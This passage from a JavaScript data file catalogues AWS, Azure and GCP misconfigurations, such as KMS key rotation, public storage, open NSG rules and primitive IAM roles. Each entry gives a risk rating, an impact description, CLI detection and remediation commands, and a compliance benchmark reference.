    remediation: 'Add restrictive NACL rules (NACLs are stateless, so both inbound and outbound rules needed):\n  aws ec2 create-network-acl-entry --network-acl-id <nacl-id> --rule-number 100 --protocol tcp --port-range From=443,To=443 --cidr-block 0.0.0.0/0 --rule-action allow --ingress\n  aws ec2 create-network-acl-entry --network-acl-id <nacl-id> --rule-number 200 --protocol tcp --port-range From=1024,To=65535 --cidr-block 0.0.0.0/0 --rule-action allow --egress\nRemove the default allow-all rules (rule number 100 in default NACLs).\nConsole: VPC > Network ACLs > Select NACL > Inbound/Outbound rules > Edit.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 5.1'
  },
  {
    id: 'AWS-028',
    service: 'KMS',
    misconfiguration: 'Automatic key rotation disabled for customer-managed CMKs',
    risk: 'Medium',
    impact: 'Without automatic key rotation, the same cryptographic key material is used indefinitely. Over time, the risk of key compromise increases. Regulatory frameworks require periodic key rotation. If a key is compromised, all data encrypted since the key was created is at risk.',
    detection: 'for key in $(aws kms list-keys --query "Keys[*].KeyId" --output text); do\n  mgr=$(aws kms describe-key --key-id "$key" --query "KeyMetadata.KeyManager" --output text)\n  if [ "$mgr" = "CUSTOMER" ]; then\n    rotation=$(aws kms get-key-rotation-status --key-id "$key" --query "KeyRotationEnabled" --output text)\n    [ "$rotation" = "False" ] && echo "NO ROTATION: $key"\n  fi\ndone',
    remediation: 'Enable automatic key rotation (rotates every year, keeps old key material for decryption):\n  aws kms enable-key-rotation --key-id <key-id>\nVerify:\n  aws kms get-key-rotation-status --key-id <key-id>\nNote: Automatic rotation is only available for symmetric CMKs. Asymmetric keys and keys in custom key stores must be rotated manually.\nConsole: KMS > Customer managed keys > Select key > Key rotation > Enable.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 3.8'
  },
  {
    id: 'AWS-029',
    service: 'KMS',
    misconfiguration: 'KMS key policy allows overly broad access',
    risk: 'High',
    impact: 'Overly permissive key policies can allow unauthorized principals to encrypt, decrypt, or manage keys. If Principal is set to "*" or allows all IAM users/roles, any authenticated entity can use the key to decrypt sensitive data.',
    detection: 'for key in $(aws kms list-keys --query "Keys[*].KeyId" --output text); do\n  policy=$(aws kms get-key-policy --key-id "$key" --policy-name default --query "Policy" --output text)\n  echo "$policy" | grep -q \'"\\*"\' && echo "OVERLY BROAD: $key"\ndone',
    remediation: 'Restrict key policy to specific IAM principals:\n  aws kms put-key-policy --key-id <key-id> --policy-name default --policy \'{"Version":"2012-10-17","Statement":[{"Sid":"EnableRootAccountManagement","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<account-id>:root"},"Action":"kms:*","Resource":"*"},{"Sid":"AllowKeyUsage","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<account-id>:role/<specific-role>"},"Action":["kms:Decrypt","kms:DescribeKey","kms:GenerateDataKey"],"Resource":"*"}]}\'\nConsole: KMS > Customer managed keys > Select key > Key policy > Edit.',
    compliance: 'CIS AWS Foundations Benchmark v1.5.0 - 3.8'
  },
  {
    id: 'AWS-030',
    service: 'ECS',
    misconfiguration: 'ECS task definitions with privileged containers',
    risk: 'Critical',
    impact: 'Privileged containers have full access to the host system including all devices, kernel capabilities, and can modify host configurations. A container escape from a privileged container gives the attacker root access to the underlying host, from which they can access other containers, instance metadata credentials, and network resources.',
    detection: 'for td in $(aws ecs list-task-definitions --query "taskDefinitionArns" --output text); do\n  aws ecs describe-task-definition --task-definition "$td" --query "taskDefinition.containerDefinitions[?privileged==`true`].{Name:name,TaskDef:$(echo $td | awk -F/ \'{print $2}\')}" --output table\ndone',
    remediation: 'Remove privileged mode from container definitions:\n  1. Create a new revision of the task definition without privileged: true.\n  2. If the container needs specific capabilities, grant only those:\n     "linuxParameters": {"capabilities": {"add": ["SYS_PTRACE"], "drop": ["ALL"]}}\n  3. Update the service to use the new task definition revision:\n     aws ecs update-service --cluster <cluster> --service <service> --task-definition <task-def>:<new-revision>\nUse read-only root filesystem where possible:\n  "readonlyRootFilesystem": true',
    compliance: 'CIS Docker Benchmark v1.5.0 - 5.4'
  },
  {
    id: 'AWS-031',
    service: 'EKS',
    misconfiguration: 'EKS cluster endpoint publicly accessible without IP restrictions',
    risk: 'High',
    impact: 'A publicly accessible Kubernetes API server can be targeted for authentication attacks, vulnerability exploitation, and unauthorized access. Even with RBAC, the attack surface is significantly increased when the API is internet-facing.',
    detection: 'aws eks describe-cluster --name <cluster-name> --query "cluster.resourcesVpcConfig.{PublicAccess:endpointPublicAccess,PrivateAccess:endpointPrivateAccess,PublicCIDRs:publicAccessCidrs}"',
    remediation: 'Restrict public access to specific CIDRs or disable entirely:\n  aws eks update-cluster-config --name <cluster> --resources-vpc-config endpointPublicAccess=true,publicAccessCidrs="<office-cidr>/32",endpointPrivateAccess=true\nOr disable public access entirely (requires VPN or bastion for kubectl):\n  aws eks update-cluster-config --name <cluster> --resources-vpc-config endpointPublicAccess=false,endpointPrivateAccess=true\nConsole: EKS > Clusters > Select cluster > Networking > Manage networking.',
    compliance: 'CIS Amazon EKS Benchmark v1.2.0 - 5.4.1'
  },
  {
    id: 'AWS-032',
    service: 'SQS',
    misconfiguration: 'SQS queue policy allows public access',
    risk: 'High',
    impact: 'A publicly accessible SQS queue allows anyone to send messages, receive messages, or delete messages. Attackers can inject malicious messages that downstream processors trust, read sensitive data from the queue, or perform denial-of-service by flooding or purging the queue.',
    detection: 'for queue in $(aws sqs list-queues --query "QueueUrls" --output text); do\n  policy=$(aws sqs get-queue-attributes --queue-url "$queue" --attribute-names Policy --query "Attributes.Policy" --output text)\n  echo "$policy" | grep -q \'"\\*"\' && echo "PUBLIC ACCESS: $queue"\ndone',
    remediation: 'Restrict the queue policy to specific AWS accounts and services:\n  aws sqs set-queue-attributes --queue-url <queue-url> --attributes \'{"Policy":"{\\"Version\\":\\"2012-10-17\\",\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":{\\"AWS\\":\\"arn:aws:iam::<account-id>:root\\"},\\"Action\\":\\"sqs:*\\",\\"Resource\\":\\"<queue-arn>\\"}]}"}\'\nEnable server-side encryption:\n  aws sqs set-queue-attributes --queue-url <queue-url> --attributes KmsMasterKeyId=alias/aws/sqs\nConsole: SQS > Queues > Select queue > Access policy > Edit.',
    compliance: 'AWS Well-Architected Framework - Security Pillar - SEC01-BP06'
  },
  {
    id: 'AWS-033',
    service: 'SNS',
    misconfiguration: 'SNS topic policy allows public subscription or publishing',
    risk: 'High',
    impact: 'A publicly subscribable SNS topic leaks all published messages to attacker-controlled endpoints. A publicly publishable topic allows attackers to send messages to all subscribers, potentially triggering Lambda functions, SQS processing, or email/SMS to users with attacker-controlled content.',
    detection: 'for topic in $(aws sns list-topics --query "Topics[*].TopicArn" --output text); do\n  attrs=$(aws sns get-topic-attributes --topic-arn "$topic" --query "Attributes.Policy" --output text)\n  echo "$attrs" | grep -q \'"\\*"\' && echo "PUBLIC ACCESS: $topic"\ndone',
    remediation: 'Restrict the topic policy:\n  aws sns set-topic-attributes --topic-arn <topic-arn> --attribute-name Policy --attribute-value \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<account-id>:root"},"Action":["sns:Publish","sns:Subscribe"],"Resource":"<topic-arn>"}]}\'\nEnable encryption:\n  aws sns set-topic-attributes --topic-arn <topic-arn> --attribute-name KmsMasterKeyId --attribute-value alias/aws/sns\nConsole: SNS > Topics > Select topic > Access policy > Edit.',
    compliance: 'AWS Well-Architected Framework - Security Pillar - SEC01-BP06'
  },
  {
    id: 'AWS-034',
    service: 'Lambda',
    misconfiguration: 'Lambda function has no dead letter queue configured',
    risk: 'Medium',
    impact: 'Without a dead letter queue, failed asynchronous invocations are silently discarded after the retry limit. Failed events containing important data are lost permanently. Error patterns and failure rates cannot be monitored. This can lead to data loss and silent failures in event-driven architectures.',
    detection: 'aws lambda list-functions --query "Functions[?DeadLetterConfig.TargetArn==null].{Name:FunctionName,Runtime:Runtime}" --output table',
    remediation: 'Configure a DLQ using SQS or SNS:\n  1. Create an SQS queue for failed events:\n     aws sqs create-queue --queue-name <func>-dlq\n  2. Grant the Lambda execution role permission to send to the queue.\n  3. Configure the DLQ:\n     aws lambda update-function-configuration --function-name <func> --dead-letter-config TargetArn=arn:aws:sqs:<region>:<account-id>:<func>-dlq\nAlternatively, use Lambda Destinations for more flexible error handling:\n  aws lambda put-function-event-invoke-config --function-name <func> --destination-config \'{"OnFailure":{"Destination":"arn:aws:sqs:<region>:<account-id>:<func>-dlq"}}\'\nConsole: Lambda > Function > Configuration > Asynchronous invocation > Edit > DLQ.',
    compliance: 'AWS Well-Architected Framework - Reliability Pillar - REL06-BP02'
  }
];

const AZURE_MISCONFIGS = [
  {
    id: 'AZ-001',
    service: 'Storage',
    misconfiguration: 'Blob container public access level set to Container or Blob',
    risk: 'Critical',
    impact: 'Public access at the Container level allows anonymous users to list and read all blobs. Blob-level access allows reading individual blobs if the URL is known. Sensitive documents, backups, configuration files, and application data can be downloaded by anyone.',
    detection: 'az storage account list --query "[].{Name:name,RG:resourceGroup}" -o table\naz storage account show --name <account> --query "allowBlobPublicAccess"\naz storage container list --account-name <account> --query "[?properties.publicAccess!=\'none\'].{Name:name,Access:properties.publicAccess}" -o table',
    remediation: 'Disable public access at the storage account level:\n  az storage account update --name <account> --resource-group <rg> --allow-blob-public-access false\nFor individual containers:\n  az storage container set-permission --name <container> --account-name <account> --public-access off\nConsole: Storage account > Configuration > Allow Blob public access > Disabled.\nConsole: Storage account > Containers > Select container > Change access level > Private.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 3.7'
  },
  {
    id: 'AZ-002',
    service: 'Storage',
    misconfiguration: 'Storage account not using customer-managed encryption keys',
    risk: 'Medium',
    impact: 'While Azure encrypts all storage with Microsoft-managed keys by default, customer-managed keys (CMK) provide additional control including the ability to revoke access, rotate keys on custom schedules, and meet specific compliance requirements for key management.',
    detection: 'az storage account list --query "[].{Name:name,Encryption:encryption.keySource}" -o table\nAccounts showing "Microsoft.Storage" use only Microsoft-managed keys.',
    remediation: 'Configure customer-managed encryption using Key Vault:\n  1. Create a Key Vault with soft-delete and purge protection:\n     az keyvault create --name <vault> --resource-group <rg> --enable-soft-delete --enable-purge-protection\n  2. Create or import a key:\n     az keyvault key create --vault-name <vault> --name <key-name> --protection software\n  3. Grant the storage account access to the key:\n     az storage account update --name <account> --resource-group <rg> --encryption-key-source Microsoft.Keyvault --encryption-key-vault <vault-uri> --encryption-key-name <key-name>\nConsole: Storage account > Encryption > Customer-managed keys > Select key vault and key.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 3.9'
  },
  {
    id: 'AZ-003',
    service: 'Storage',
    misconfiguration: 'Soft delete not enabled for blobs and containers',
    risk: 'Medium',
    impact: 'Without soft delete, deleted blobs and containers are permanently removed immediately. Accidental deletions, ransomware attacks that delete data, and malicious insider actions result in irreversible data loss. There is no recovery window.',
    detection: 'az storage account blob-service-properties show --account-name <account> --query "{BlobSoftDelete:deleteRetentionPolicy.enabled,ContainerSoftDelete:containerDeleteRetentionPolicy.enabled,Days:deleteRetentionPolicy.days}"',
    remediation: 'Enable soft delete for blobs and containers:\n  az storage account blob-service-properties update --account-name <account> --resource-group <rg> --enable-delete-retention true --delete-retention-days 30\n  az storage account blob-service-properties update --account-name <account> --resource-group <rg> --enable-container-delete-retention true --container-delete-retention-days 30\nConsole: Storage account > Data protection > Enable soft delete for blobs (30 days) and containers (30 days).',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 3.11'
  },
  {
    id: 'AZ-004',
    service: 'NSG',
    misconfiguration: 'Network Security Group allows all inbound traffic (Any/Any rule)',
    risk: 'Critical',
    impact: 'An NSG rule allowing all inbound traffic from any source on any port effectively disables network filtering. All services on associated VMs are exposed to the internet, including management ports, databases, and internal APIs.',
    detection: 'az network nsg list --query "[].{Name:name,RG:resourceGroup}" -o table\naz network nsg rule list --nsg-name <nsg> --resource-group <rg> --query "[?access==\'Allow\' && sourceAddressPrefix==\'*\' && destinationPortRange==\'*\' && direction==\'Inbound\'].{Name:name,Priority:priority,Source:sourceAddressPrefix,DestPort:destinationPortRange}" -o table',
    remediation: 'Remove overly permissive rules and replace with specific allow rules:\n  az network nsg rule delete --nsg-name <nsg> --resource-group <rg> --name <rule-name>\n  az network nsg rule create --nsg-name <nsg> --resource-group <rg> --name AllowHTTPS --priority 100 --direction Inbound --access Allow --protocol Tcp --source-address-prefixes "*" --destination-port-ranges 443\n  az network nsg rule create --nsg-name <nsg> --resource-group <rg> --name AllowSSH --priority 200 --direction Inbound --access Allow --protocol Tcp --source-address-prefixes <office-ip>/32 --destination-port-ranges 22\nConsole: NSG > Inbound security rules > Delete Any/Any rules > Add specific rules.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 6.1'
  },
  {
    id: 'AZ-005',
    service: 'NSG',
    misconfiguration: 'Unrestricted SSH (port 22) or RDP (port 3389) access from internet',
    risk: 'Critical',
    impact: 'Exposing SSH or RDP to the entire internet enables brute force attacks, credential stuffing, and exploitation of protocol vulnerabilities. RDP exposure is the leading initial access vector for ransomware in Azure environments.',
    detection: 'az network nsg rule list --nsg-name <nsg> --resource-group <rg> --query "[?access==\'Allow\' && direction==\'Inbound\' && sourceAddressPrefix==\'*\' && (destinationPortRange==\'22\' || destinationPortRange==\'3389\')].{Name:name,Port:destinationPortRange}" -o table',
    remediation: 'Restrict management port access:\n  az network nsg rule update --nsg-name <nsg> --resource-group <rg> --name <rule-name> --source-address-prefixes <vpn-ip>/32 <office-ip>/32\nBetter: Use Azure Bastion for secure management access without exposing ports:\n  az network bastion create --name <bastion> --resource-group <rg> --vnet-name <vnet> --public-ip-address <pip>\nOr use Just-In-Time VM access via Microsoft Defender for Cloud.\nConsole: NSG > Inbound rules > Edit SSH/RDP rules > Restrict source IPs.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 6.2, 6.3'
  },
  {
    id: 'AZ-006',
    service: 'Key Vault',
    misconfiguration: 'Key Vault soft-delete not enabled',
    risk: 'High',
    impact: 'Without soft-delete, deleted keys, secrets, and certificates are permanently and irrecoverably removed. If an encryption key is accidentally deleted, all data encrypted with that key becomes permanently inaccessible. Malicious deletion of secrets can cause widespread application outages.',
    detection: 'az keyvault list --query "[].{Name:name,SoftDelete:properties.enableSoftDelete,PurgeProtection:properties.enablePurgeProtection}" -o table',
    remediation: 'Enable soft-delete and purge protection (note: soft-delete is now enabled by default on new vaults and cannot be disabled):\n  az keyvault update --name <vault> --resource-group <rg> --enable-soft-delete true\n  az keyvault update --name <vault> --resource-group <rg> --enable-purge-protection true\nNote: Purge protection, once enabled, cannot be disabled. It prevents permanent deletion even by administrators during the retention period.\nConsole: Key Vault > Properties > Soft-delete > Enabled, Purge protection > Enabled.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 8.5'
  },
  {
    id: 'AZ-007',
    service: 'Key Vault',
    misconfiguration: 'Overly permissive Key Vault access policies',
    risk: 'High',
    impact: 'Access policies that grant all permissions (Get, List, Set, Delete, Recover, Backup, Restore, Purge) to broad principals violate least privilege. A compromised identity can read all secrets, modify encryption keys, or delete critical certificates.',
    detection: 'az keyvault show --name <vault> --query "properties.accessPolicies[].{ObjectId:objectId,Keys:permissions.keys,Secrets:permissions.secrets,Certs:permissions.certificates}" -o table',
    remediation: 'Restrict access policies to minimum required permissions:\n  az keyvault set-policy --name <vault> --object-id <principal-id> --secret-permissions get list --key-permissions get list wrapKey unwrapKey --certificate-permissions get list\nBetter: Migrate to RBAC-based access control:\n  az keyvault update --name <vault> --resource-group <rg> --enable-rbac-authorization true\n  az role assignment create --role "Key Vault Secrets User" --assignee <principal-id> --scope <vault-resource-id>\nConsole: Key Vault > Access configuration > Switch to RBAC > Assign specific roles.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 8.1'
  },
  {
    id: 'AZ-008',
    service: 'Azure AD',
    misconfiguration: 'No Conditional Access policies configured',
    risk: 'High',
    impact: 'Without Conditional Access, all authentication attempts are treated equally regardless of location, device state, risk level, or sign-in behavior. An attacker with valid credentials can sign in from any location on any device without additional verification.',
    detection: 'az rest --method GET --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" --query "value[].{Name:displayName,State:state}" -o table\nIf no policies are returned or all are in "disabled" state, Conditional Access is not in use.',
    remediation: 'Create baseline Conditional Access policies:\n  1. Require MFA for all users:\n     az rest --method POST --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" --body \'{"displayName":"Require MFA for all users","state":"enabled","conditions":{"users":{"includeUsers":["All"]},"applications":{"includeApplications":["All"]}},"grantControls":{"operator":"OR","builtInControls":["mfa"]}}\'\n  2. Block legacy authentication protocols.\n  3. Require compliant device for admin access.\n  4. Block sign-ins from risky locations.\nConsole: Azure AD > Security > Conditional Access > New policy.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 1.2.1'
  },
  {
    id: 'AZ-009',
    service: 'Azure AD',
    misconfiguration: 'MFA not enforced for privileged accounts',
    risk: 'Critical',
    impact: 'Global Administrators, Security Administrators, and other privileged roles without MFA are prime targets. A compromised admin password grants full tenant control. Azure AD admin accounts are targeted by phishing, password spray, and credential stuffing attacks.',
    detection: 'az ad user list --query "[].{UPN:userPrincipalName,MFA:strongAuthenticationDetail}" -o table\nCheck admin role assignments:\n  az role assignment list --role "Owner" --query "[].{Principal:principalName}" -o table\nFor MFA status, use the Microsoft Graph API or Azure AD admin center.',
    remediation: 'Enforce MFA for all admin accounts via Conditional Access:\n  Create a policy targeting directory roles (Global Administrator, Security Administrator, etc.) requiring MFA.\nEnable Security Defaults if Conditional Access is not available (P1 license required for CA):\n  az rest --method PATCH --url "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy" --body \'{"isEnabled":true}\'\nConsole: Azure AD > Security > Conditional Access > New policy > Target admin roles > Require MFA.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 1.1.1'
  },
  {
    id: 'AZ-010',
    service: 'Azure AD',
    misconfiguration: 'Guest user access not restricted',
    risk: 'Medium',
    impact: 'Default guest user permissions allow external users to enumerate directory users, groups, and applications. Guests can discover organizational structure, identify privileged accounts, and gather information for targeted attacks. Overly permissive guest settings increase insider threat risk from partners and vendors.',
    detection: 'az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" --query "{GuestRestrictions:guestUserRoleId,AllowInvites:allowInvitesFrom}"',
    remediation: 'Restrict guest user permissions:\n  az rest --method PATCH --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" --body \'{"guestUserRoleId":"2af84b1e-32c8-42b7-82bc-daa82404023b"}\'\nThis sets guest permissions to "Restricted" (limited directory access).\nRestrict who can invite guests:\n  az rest --method PATCH --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" --body \'{"allowInvitesFrom":"adminsAndGuestInviters"}\'\nConsole: Azure AD > External Identities > External collaboration settings > Guest user access restrictions.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 1.15'
  },
  {
    id: 'AZ-011',
    service: 'App Service',
    misconfiguration: 'App Service allows HTTP (not HTTPS-only)',
    risk: 'High',
    impact: 'When HTTP is allowed, traffic including authentication tokens, session cookies, and sensitive data can be intercepted via man-in-the-middle attacks. Users who access the application via HTTP have their data transmitted in plaintext.',
    detection: 'az webapp list --query "[].{Name:name,RG:resourceGroup}" -o table\naz webapp show --name <app> --resource-group <rg> --query "httpsOnly"',
    remediation: 'Enforce HTTPS-only:\n  az webapp update --name <app> --resource-group <rg> --set httpsOnly=true\nAlso set the minimum TLS version:\n  az webapp config set --name <app> --resource-group <rg> --min-tls-version 1.2\nConsole: App Service > Settings > TLS/SSL settings > HTTPS Only: On > Minimum TLS Version: 1.2.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 9.2'
  },
  {
    id: 'AZ-012',
    service: 'App Service',
    misconfiguration: 'App Service not using managed identity',
    risk: 'Medium',
    impact: 'Without managed identity, applications store credentials (connection strings, API keys, certificates) in configuration or code. These credentials can be leaked through source control, logging, error messages, or configuration exposure. Managed identities eliminate the need for stored credentials.',
    detection: 'az webapp identity show --name <app> --resource-group <rg>\nIf no identity is returned, managed identity is not configured.',
    remediation: 'Enable system-assigned managed identity:\n  az webapp identity assign --name <app> --resource-group <rg>\nGrant the identity access to required resources:\n  az role assignment create --assignee <principal-id> --role "Storage Blob Data Reader" --scope <storage-resource-id>\nUpdate application code to use DefaultAzureCredential instead of connection strings.\nConsole: App Service > Identity > System assigned > Status: On.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 9.5'
  },
  {
    id: 'AZ-013',
    service: 'App Service',
    misconfiguration: 'FTP/FTPS access enabled on App Service',
    risk: 'Medium',
    impact: 'FTP transmits credentials and data in plaintext. Even FTPS can be vulnerable to downgrade attacks. FTP access provides an additional attack vector for credential brute force and unauthorized file deployment. Modern deployment should use Git, CI/CD, or ZIP deploy.',
    detection: 'az webapp config show --name <app> --resource-group <rg> --query "ftpsState"',
    remediation: 'Disable FTP access entirely:\n  az webapp config set --name <app> --resource-group <rg> --ftps-state Disabled\nIf FTP is required for legacy reasons, at minimum enforce FTPS:\n  az webapp config set --name <app> --resource-group <rg> --ftps-state FtpsOnly\nConsole: App Service > Configuration > General settings > FTP state: Disabled.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 9.10'
  },
  {
    id: 'AZ-014',
    service: 'SQL Database',
    misconfiguration: 'Azure SQL public network access enabled',
    risk: 'High',
    impact: 'SQL databases with public endpoints are accessible from the internet. Even with firewall rules, the public endpoint increases attack surface. SQL injection from compromised web applications, credential brute force, and man-in-the-middle attacks become feasible.',
    detection: 'az sql server list --query "[].{Name:name,RG:resourceGroup,PublicAccess:publicNetworkAccess}" -o table',
    remediation: 'Disable public network access and use Private Endpoints:\n  az sql server update --name <server> --resource-group <rg> --set publicNetworkAccess="Disabled"\nCreate a Private Endpoint:\n  az network private-endpoint create --name <pe-name> --resource-group <rg> --vnet-name <vnet> --subnet <subnet> --private-connection-resource-id <sql-server-id> --group-ids sqlServer --connection-name <connection>\nConsole: SQL server > Networking > Public access: Disabled > Private endpoint connections > Add.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 4.1.1'
  },
  {
    id: 'AZ-015',
    service: 'SQL Database',
    misconfiguration: 'Auditing not enabled on Azure SQL Database',
    risk: 'High',
    impact: 'Without auditing, database operations including queries, logins, and schema changes are not logged. Security incidents involving data access or modification cannot be investigated. Compliance requirements for database audit trails are not met.',
    detection: 'az sql server audit-policy show --name <server> --resource-group <rg> --query "{State:state,StorageEndpoint:storageEndpoint,RetentionDays:retentionDays}"',
    remediation: 'Enable auditing to a storage account or Log Analytics:\n  az sql server audit-policy update --name <server> --resource-group <rg> --state Enabled --storage-account <storage-id> --retention-days 90\nOr send to Log Analytics for advanced querying:\n  az sql server audit-policy update --name <server> --resource-group <rg> --state Enabled --log-analytics-target-state Enabled --log-analytics-workspace-resource-id <workspace-id>\nConsole: SQL server > Auditing > Enable > Configure storage account or Log Analytics workspace.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 4.1.3'
  },
  {
    id: 'AZ-016',
    service: 'Virtual Machine',
    misconfiguration: 'Azure Disk Encryption not enabled on OS and data disks',
    risk: 'High',
    impact: 'Unencrypted VM disks store data in plaintext on the underlying storage infrastructure. Snapshots and disk exports expose data. Compliance requirements for encryption at rest (HIPAA, PCI-DSS, FedRAMP) are not met.',
    detection: 'az vm encryption show --name <vm> --resource-group <rg> --query "{OSDisk:disks[0].statuses[0].displayStatus,DataDisks:disks[1:]}"',
    remediation: 'Enable Azure Disk Encryption (uses BitLocker for Windows, DM-Crypt for Linux):\n  1. Ensure Key Vault exists with disk encryption access enabled:\n     az keyvault update --name <vault> --resource-group <rg> --enabled-for-disk-encryption true\n  2. Enable encryption:\n     az vm encryption enable --name <vm> --resource-group <rg> --disk-encryption-keyvault <vault-name> --volume-type All\nConsole: VM > Disks > Select disk > Encryption > Enable encryption with platform or customer-managed key.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 7.2'
  },
  {
    id: 'AZ-017',
    service: 'SQL Database',
    misconfiguration: 'Transparent Data Encryption not using customer-managed key',
    risk: 'Medium',
    impact: 'While TDE is enabled by default with service-managed keys, customer-managed keys provide additional control over the encryption lifecycle. Organizations cannot revoke encryption access or rotate keys independently with service-managed encryption.',
    detection: 'az sql db tde show --server <server> --database <db> --resource-group <rg> --query "{Status:status,Type:type}"',
    remediation: 'Configure TDE with a customer-managed key:\n  1. Create a key in Key Vault:\n     az keyvault key create --vault-name <vault> --name <tde-key> --protection software\n  2. Assign the key to the SQL server:\n     az sql server tde-key set --server <server> --resource-group <rg> --server-key-type AzureKeyVault --kid <key-uri>\nConsole: SQL server > Transparent data encryption > Customer-managed key > Select Key Vault and key.',
    compliance: 'CIS Microsoft Azure Foundations Benchmark v2.0.0 - 4.5'
  }
];

const GCP_MISCONFIGS = [
  {
    id: 'GCP-001',
    service: 'Cloud Storage',
    misconfiguration: 'Cloud Storage bucket publicly accessible via allUsers or allAuthenticatedUsers',
    risk: 'Critical',
    impact: 'Buckets with allUsers access allow anyone on the internet to list and download objects. allAuthenticatedUsers allows any Google account holder to access the data. Sensitive data including credentials, PII, backups, and source code can be exfiltrated at scale.',
    detection: 'gsutil iam get gs://<bucket> | grep -E "allUsers|allAuthenticatedUsers"\ngcloud storage buckets describe gs://<bucket> --format="json(iamConfiguration)"\nFor all buckets:\n  for bucket in $(gsutil ls); do echo "--- $bucket ---"; gsutil iam get "$bucket" | grep -E "allUsers|allAuthenticatedUsers" && echo "PUBLIC"; done',
    remediation: 'Remove public access:\n  gsutil iam ch -d allUsers gs://<bucket>\n  gsutil iam ch -d allAuthenticatedUsers gs://<bucket>\nEnable uniform bucket-level access (prevents ACL-based public access):\n  gsutil uniformbucketlevelaccess set on gs://<bucket>\nEnable organization policy to prevent public access:\n  gcloud resource-manager org-policies enable-enforce constraints/storage.publicAccessPrevention --organization=<org-id>\nConsole: Cloud Storage > Bucket > Permissions > Remove allUsers/allAuthenticatedUsers entries.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 5.1'
  },
  {
    id: 'GCP-002',
    service: 'Cloud Storage',
    misconfiguration: 'Uniform bucket-level access not enabled',
    risk: 'High',
    impact: 'Without uniform bucket-level access, both IAM policies and legacy ACLs control access. This dual permission system is complex, error-prone, and difficult to audit. ACLs can grant unintended access that is not visible in IAM policy reviews.',
    detection: 'gsutil uniformbucketlevelaccess get gs://<bucket>\ngcloud storage buckets describe gs://<bucket> --format="value(iamConfiguration.uniformBucketLevelAccess.enabled)"',
    remediation: 'Enable uniform bucket-level access:\n  gsutil uniformbucketlevelaccess set on gs://<bucket>\nNote: This is a one-way operation. After 90 days, it becomes permanent and ACLs are irrevocably removed. Migrate all ACL-based permissions to IAM before enabling.\nConsole: Cloud Storage > Bucket > Permissions > Access control: Uniform.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 5.2'
  },
  {
    id: 'GCP-003',
    service: 'Cloud Storage',
    misconfiguration: 'No retention policy configured on storage buckets',
    risk: 'Medium',
    impact: 'Without retention policies, objects can be deleted or overwritten at any time. Compliance requirements for data retention cannot be enforced. Ransomware or malicious insiders can permanently destroy data with no recovery option.',
    detection: 'gsutil retention get gs://<bucket>\nIf "has no Retention Policy", no policy is configured.',
    remediation: 'Set a retention policy:\n  gsutil retention set <duration> gs://<bucket>\n  Example: gsutil retention set 365d gs://<bucket>\nLock the retention policy to make it immutable (cannot be shortened or removed):\n  gsutil retention lock gs://<bucket>\nWarning: Locking is irreversible. The bucket cannot be deleted until all objects have aged past the retention period.\nConsole: Cloud Storage > Bucket > Protection > Retention policy > Set duration.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 5.3'
  },
  {
    id: 'GCP-004',
    service: 'IAM',
    misconfiguration: 'Primitive roles (Owner/Editor) assigned to users or service accounts',
    risk: 'Critical',
    impact: 'Primitive roles (Owner, Editor, Viewer) grant broad permissions across all GCP services. Editor has read/write access to most resources. Owner can modify IAM policies. These roles violate least privilege and give compromised accounts excessive access across the entire project.',
    detection: 'gcloud projects get-iam-policy <project-id> --format=json | jq \'.bindings[] | select(.role == "roles/owner" or .role == "roles/editor") | {role, members}\'\ngcloud asset search-all-iam-policies --scope=projects/<project-id> --query="roles/editor OR roles/owner"',
    remediation: 'Replace primitive roles with predefined or custom roles:\n  1. Identify what access the principal actually needs.\n  2. Remove the primitive role:\n     gcloud projects remove-iam-policy-binding <project-id> --member=user:<email> --role=roles/editor\n  3. Grant specific predefined roles:\n     gcloud projects add-iam-policy-binding <project-id> --member=user:<email> --role=roles/compute.viewer\n     gcloud projects add-iam-policy-binding <project-id> --member=user:<email> --role=roles/storage.objectViewer\nConsole: IAM & Admin > IAM > Edit principal > Replace role with specific predefined roles.',
    compliance: 'CIS Google Cloud Platform Foundation Benchmark v2.0.0 - 1.1'
  },
  {
    id: 'GCP-005',
    service: 'IAM',
    misconfiguration: 'Service account keys created and stored externally',
    risk: 'High',
    impact: 'Exported service account keys are long-lived credentials that do not expire by default. They can be leaked through source control, developer laptops, CI/CD logs, or configuration files. Compromised keys provide persistent access until manually rotated.',
    detection: 'gcloud iam service-accounts list --format="value(email)" | while read sa; do\n  keys=$(gcloud iam service-accounts keys list --iam-account="$sa" --managed-by=user --format="value(name)")\n  [ -n "$keys" ] && echo "USER-MANAGED KEYS: $sa"\ndone',
